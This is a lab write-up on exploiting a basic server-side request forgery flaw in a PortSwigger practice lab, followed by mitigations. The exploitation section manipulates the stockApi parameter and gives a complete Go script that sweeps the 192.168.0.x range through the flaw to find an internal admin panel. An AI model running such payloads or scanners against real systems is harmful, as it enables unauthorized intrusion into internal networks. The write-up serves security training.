## Basic SSRF Against Another Back-End System

### Overview

Server-Side Request Forgery (SSRF) is a critical web security vulnerability that allows an attacker to induce the server-side application to make HTTP requests to an arbitrary domain or IP address chosen by the attacker. This can lead to unauthorized access to internal systems, bypassing firewalls and network segmentation.

In this demonstration, we exploit an SSRF vulnerability in a stock checking feature of an e-commerce application. The application fetches stock information from a user-supplied URL without proper validation, allowing us to access internal administrative panels.

### Root Cause

- Lack of input validation and whitelist enforcement on the `stockApi` URL parameter.
- Internal back-end systems (e.g., admin panels) are accessible from the application server without authentication.
- Trust relationship between the front-end application and internal services, assuming server-initiated requests are safe.

### Impact

Successful exploitation can lead to:
- Unauthorized access to internal network resources.
- Exposure of sensitive administrative interfaces.
- Potential for further attacks like reading local files or pivoting to other internal services.
- Data leakage or manipulation in connected systems.

### Exploitation

#### Step 1: Initial Request Analysis
Upon clicking the "Check stock" button on the product details page, the application sends a POST request to `/product/stock` with the `stockApi` parameter. This parameter contains a URL that the server uses to fetch stock information.

![Intercepting the initial stock check request](image-11.png)

#### Step 2: Decoding the URL
The `stockApi` parameter is URL-encoded. Decoding it reveals the internal endpoint being accessed: `http://192.168.0.1:8080/product/stock/check?productId=1&storeId=1`. This confirms that the application is fetching data from an internal system.

![URL-decoded stockApi parameter](image-12.png)

#### Step 3: Testing Internal Access
Modifying the IP address in the `stockApi` parameter to `192.168.0.1` results in an HTTP 400 Bad Request response, indicating an invalid or unreachable internal host.

![Testing access to internal IP 192.168.0.1](image-13.png)

#### Step 4: Identifying Valid Internal IPs
Changing the IP to `192.168.0.12` yields an HTTP 500 Internal Server Error. This status code suggests that the server successfully processed the modified `stockApi` parameter and attempted to connect to the specified internal IP, but the connection failed due to an invalid or unresponsive back-end system.

![Response from internal IP 192.168.0.12](image-14.png)

#### Step 5: Automated Scanning
To efficiently identify valid internal IP addresses, a custom Go script was developed to scan the `192.168.0.x` range. The script targets the admin endpoint on port 8080 and checks for non-500 status codes, which indicate successful connections.

The script includes the following key components:

```go
package main

import (
	"fmt"
	"net/http"
	"net/url"
	"strings"
	"sync"
)

func sendRequest(wg *sync.WaitGroup, targetURL string, sessionCookie string, internalIP string) {
	defer wg.Done()

	// Skip specific IP if needed (e.g., known invalid IPs)
	if internalIP == "192.168.0.1" {
		return
	}

	// Prepare form data for the SSRF payload
	data := url.Values{}
	data.Set("stockApi", fmt.Sprintf("http://%s:8080/admin", internalIP))

	// Create a new POST request
	req, err := http.NewRequest("POST", targetURL, strings.NewReader(data.Encode()))
	if err != nil {
		fmt.Printf("Error creating request for IP %s: %v\n", internalIP, err)
		return
	}

	// Set headers and cookies manually
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	req.AddCookie(&http.Cookie{Name: "session", Value: sessionCookie})

	client := http.Client{}
	resp, err := client.Do(req)
	if err != nil {
		fmt.Printf("Error sending request for IP %s: %v\n", internalIP, err)
		return
	}
	defer resp.Body.Close()

	fmt.Printf("[*] Trying IP: %-15s\r", internalIP)

	// In this lab, a 500 status typically means the back-end IP was invalid
	if resp.StatusCode != http.StatusInternalServerError {
		fmt.Printf("\n[+] Found valid internal IP address: %s (Status: %d)\n", internalIP, resp.StatusCode)
	}
}

func main() {
	targetURL := "https://0aa60052043637348296b0a1003e00ba.web-security-academy.net/product/stock"
	sessionCookie := "4boavJK6rNCZ0h2is8UeI6ITVpMs082S"

	var wg sync.WaitGroup

	// Scan the 192.168.0.x range
	for i := 0; i < 256; i++ {
		ip := fmt.Sprintf("192.168.0.%d", i)
		wg.Add(1)
		go sendRequest(&wg, targetURL, sessionCookie, ip)
	}

	wg.Wait()
	fmt.Println("\n[*] Scan complete.")
}
```

Execute the script using: `go run ssrf.go`

![Terminal output from running the Go scanning script](image-15.png)

#### Step 6: Accessing Administrative Functions
Once valid internal IPs are identified, appending `/admin` to the URL allows access to administrative endpoints.

![Appending /admin to the internal URL](image-16.png)

#### Step 7: Retrieving Admin Data
The server successfully fetches and returns data from the internal admin endpoint, demonstrating unauthorized access to sensitive resources.

![Request to the internal admin endpoint](image-17.png)

#### Step 8: Confirming Full Access
The response contains admin panel data, confirming the exploitation's success.

![Response with admin panel data](image-18.png)

#### Step 9: Lab Completion
The vulnerability exploitation is verified, and the lab is marked as solved.

![Lab solved confirmation](image-19.png)

### Mitigation

- Implement strict allowlists of permitted domains and IP ranges for URL fetching.
- Block private, reserved, and loopback IP addresses (e.g., 192.168.x.x, 10.x.x.x, 127.0.0.1).
- Use a hardened HTTP client that disables redirects and unsupported schemes.
- Enforce network segmentation to prevent application servers from accessing sensitive internal services.
- Validate and sanitize all user-supplied URLs.
- Use server-side controls to restrict outbound requests.

### Tools and Resources

- **Burp Suite Community Edition**: For intercepting and modifying HTTP requests.
- **Go Programming Language**: For writing custom automation scripts.
- **PortSwigger Web Security Academy**: Lab environment for practicing SSRF vulnerabilities.

### Conclusion

This demonstration highlights the dangers of SSRF vulnerabilities in web applications. Proper input validation and network controls are essential to prevent such attacks. Always follow security best practices when handling user-supplied URLs in server-side code.

Happy (ethical) hacking!